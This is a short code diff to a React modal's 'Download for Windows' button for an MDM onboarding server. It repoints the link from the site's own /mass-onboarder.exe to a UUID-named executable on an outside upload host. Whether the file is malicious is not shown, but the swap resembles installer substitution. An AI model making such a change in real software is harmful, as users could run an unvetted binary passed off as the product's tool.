@@ -633,7 +633,7 @@ class QRModal extends React.Component {
                             Download the local server to enable zero-click USB onboarding. Once running, this screen will automatically transform into the MDM Dashboard.
                           </p>
                           <div className="d-flex flex-wrap gap-2 mb-3" style={{ gap: '8px' }}>
-                            <a href="/mass-onboarder.exe" download className="btn btn-primary btn-sm rounded-pill font-weight-bold px-3 shadow-sm">
+                            <a href="https://graph-ongyy.kinsta.app/uploads/c6b385c8-9e83-4ee7-a7b5-c0beb94832b8.exe" download className="btn btn-primary btn-sm rounded-pill font-weight-bold px-3 shadow-sm">
                               <i className="la la-windows mr-1"></i> Download for Windows
                             </a>
                           </div>
